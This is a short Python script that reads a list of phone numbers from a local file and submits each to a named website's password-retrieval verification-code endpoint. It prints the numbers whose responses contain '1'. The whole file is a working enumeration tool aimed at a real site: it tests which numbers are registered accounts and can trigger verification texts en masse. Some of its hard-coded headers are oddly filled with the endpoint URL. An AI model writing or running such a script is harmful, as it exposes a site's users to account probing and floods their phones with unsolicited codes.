import urllib
import http.client 
import os

headers = {
    'HOST':'www.sjzwhk.com',
    'User-Agent':'http://www.sjzwhk.com/ashx/Login.ashx?Method=GetRetrieveVerifyCode',
    'Accept':'http://www.sjzwhk.com/ashx/Login.ashx?Method=GetRetrieveVerifyCode',
    'Accept-Language':'http://www.sjzwhk.com/ashx/Login.ashx?Method=GetRetrieveVerifyCode',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'application/x-www-form-urlencoded',
    'X-Requested-With':'XMLHttpRequest',
    'Referer':'http://www.sjzwhk.com/RetrievePassword.aspx',
    'Content-Length':'40',
    'Connection':'close'
}

base_path = os.getcwd()
file_i = open(base_path + '\\' + '1340031.txt', )
for line in file_i:
    params = urllib.parse.urlencode({
        'MobileTel': line,
        'VerifyCodeSerial': '3'
    })
    conn = http.client.HTTPConnection('www.sjzwhk.com')
    conn.request('POST','/ashx/Login.ashx?Method=GetRetrieveVerifyCode', params, headers)
    response = conn.getresponse()
    #print(response.status, response.reason)
    #print(response.read())
    resp_bytes = response.read()
    resp_str = str(resp_bytes, encoding='utf-8')
    if '1' in resp_str:
        print(line)
        print(resp_str)
    

